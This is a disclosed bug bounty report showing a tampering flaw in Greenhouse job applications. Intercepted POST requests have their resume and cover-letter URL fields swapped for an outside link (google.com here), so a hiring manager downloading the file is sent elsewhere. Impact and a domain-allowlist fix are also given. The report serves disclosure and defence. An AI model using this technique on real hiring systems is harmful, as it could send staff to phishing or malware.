# Open Redirect in <customer>.greenhouse.io

## Report Details
- **Report ID**: 203726
- **URL**: https://hackerone.com/reports/203726
- **State**: Closed
- **Severity**: high
- **Submitted**: 2017-02-06T09:14:17.418Z
- **Disclosed**: 2017-07-08T09:12:59.363Z

## Reporter
- **Username**: cyneox
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: greenhouse

## Vulnerability Information
## Open Redirect in scout24.greenhouse.io

The **Scout24 Security Team** did a penetration test against `scout24.greenhouse.io` in order to verify how Scout24 relevant data is protected against common attack vectors. Basically we have tested the (web) application against [OWASP Top 10](https://www.owasp.org/index.php/Category:OWASP_Top_Ten_Project) using industry common metholodogies. 

## Reproduction steps

* Visit https://boards.greenhouse.io/scout24 and click on some job offer (I chosed [this one](https://boards.greenhouse.io/scout24/jobs/503488))
* After completing your personal information, you can *upload* some documents
	* Click `Attach` both under *Resume/CV* and *Cover Letter*
	* Upload some PDF files from your local host (in my case the file uwas called `neu.pdf`)
* In the end you send your application by clicking on `Submit Application`

Using a HTTP proxy (in my case that was [Burp](https://portswigger.net/burp/)) I was able to intercept the `POST` request made by the browser before being sent to the `greenhouse.io` API. This is some sample request:

### Proof-of-Concept (PoC)

```.http
POST /scout24/jobs/503488 HTTP/1.1
Host: boards.greenhouse.io
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:47.0) Gecko/20100101 Firefox/47.0
Accept: text/html, */*; q=0.01
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
X-NewRelic-ID: VQ4PWFNbGwIFU1dbAgcB
X-CSRF-Token: zF19Ky8GR0J/ZP7aLfFiN+p8Udc+X8ikPyk0cX7LlzgS0i4wWFIchmqcmsR3aXA0T1XSNrXSWdrVb47bGjGrEg==
X-Requested-With: XMLHttpRequest
Referer: https://boards.greenhouse.io/scout24/jobs/503488
Content-Length: 4086
Content-Type: multipart/form-data; boundary=---------------------------844282227400113298508475861
Cookie: __utma=44269810.1998188318.1484665255.1484837763.1484901247.18; __utmz=44269810.1484837763.17.11.utmcsr=scout24.eu.auth0.com|utmccn=(referral)|utmcmd=referral|utmcct=/login/callback; __zlcmid=edg9prI9rr6P3K; __utmc=44269810; __utmb=44269810.15.9.1484902626060; __atuvc=4%7C3; __atuvs=5881cd5b6c1ca704003; _jbs=7897bb31a3e984da1f15ec3b3f0e8129; __utmt=1
Connection: close

[...]
-----------------------------844282227400113298508475861
Content-Disposition: form-data; name="job_application[resume_url]"

https://grnhse-prod-jben-us-east-1.s3.amazonaws.com/applications%2Fresumes%2F1484902660983-1663bnwl7dt-b044057e6364840cde6c41d55de3a1e1%2Fneu.pdf
-----------------------------844282227400113298508475861
Content-Disposition: form-data; name="job_application[resume_url_filename]"

neu.pdf
-----------------------------844282227400113298508475861
Content-Disposition: form-data; name="job_application[cover_letter_url]"

https://grnhse-prod-jben-us-east-1.s3.amazonaws.com/applications%2Fresumes%2F1484902672335-lpk5xur1na-67346266367805828242f31b3887e539%2Fneu.pdf
-----------------------------844282227400113298508475861
Content-Disposition: form-data; name="job_application[cover_letter_url_filename]"

neu.pdf
-----------------------------844282227400113298508475861--
```

As you can notice the files have been already uploaded to `AWS` and therfore a S3 bucket links are 
used within the requests. 

## Exploitability

Using a browser and a HTTP proxy the request can be easily intercepted. In the **original** request the `Content-Disposition` parameter `job_application[cover_letter_url]` in the `POST` request contains a S3 bucket link. However, after tampering the request, the parameters values can be changed. In our specific case the value (basically an URL) could be changed to:

* a phishing site
* a site containing some malware

After intercepting the request, the parameter was modified like this:

```.http
POST /scout24/jobs/503488 HTTP/1.1
Host: boards.greenhouse.io
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:47.0) Gecko/20100101 Firefox/47.0
Accept: text/html, */*; q=0.01
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
X-NewRelic-ID: VQ4PWFNbGwIFU1dbAgcB
X-CSRF-Token: zF19Ky8GR0J/ZP7aLfFiN+p8Udc+X8ikPyk0cX7LlzgS0i4wWFIchmqcmsR3aXA0T1XSNrXSWdrVb47bGjGrEg==
X-Requested-With: XMLHttpRequest
Referer: https://boards.greenhouse.io/scout24/jobs/503488
Content-Length: 4086
Content-Type: multipart/form-data; boundary=---------------------------844282227400113298508475861
Cookie: __utma=44269810.1998188318.1484665255.1484837763.1484901247.18; __utmz=44269810.1484837763.17.11.utmcsr=scout24.eu.auth0.com|utmccn=(referral)|utmcmd=referral|utmcct=/login/callback; __zlcmid=edg9prI9rr6P3K; __utmc=44269810; __utmb=44269810.15.9.1484902626060; __atuvc=4%7C3; __atuvs=5881cd5b6c1ca704003; _jbs=7897bb31a3e984da1f15ec3b3f0e8129; __utmt=1
Connection: close
[...]

-----------------------------844282227400113298508475861
Content-Disposition: form-data; name="job_application[resume_url]"

https://google.com
-----------------------------844282227400113298508475861
Content-Disposition: form-data; name="job_application[resume_url_filename]"

neu.pdf
-----------------------------844282227400113298508475861
Content-Disposition: form-data; name="job_application[cover_letter_url]"

http://google.com
-----------------------------844282227400113298508475861
Content-Disposition: form-data; name="job_application[cover_letter_url_filename]"
```

Whenever the hiring manager will try to view the uploaded content, the application will not be able to render the content. Instead the person will then try to **download** the file by clicking on `Download` (left upper corner). Although the browser shows that the URL points to some specific `AWS` domain, the content is actually loaded from somewhere else (in this case from [https://google.com](https://google.com)). 

Again, an attacker could then submit some URL containing malicious content or some phishing site. Only for the purpose of this report, something unspectacular like [https://google.com](https://google.com) has been chosen. 

## Impact

The attack can be conducted in multiple scenarios:

* anonymous person applies for some jobs and manipulates the parameters (like described above)
* internal employee adds referal for some person and also manipulates the parameters

In both cases the hiring manager would then unknowingly access the manipulated links which could then lead to:

* installation of trojan horses / ransomeware (in general malicious content)
* a phishing site where e.g. AD credentials are claimed to be required
* CSRF (Cross-Site Request Forgery) [attacks](https://www.owasp.org/index.php/Cross-Site_Request_Forgery_(CSRF))

## Remediation

The affected parameter should be first validated against some regular expression (e.g. allow only links that point to `grnhse-prod-jben-*.s3.amazonaws.com`). 







## Attachments
- Selection_120.png
- Selection_121.png
- Selection_119.png
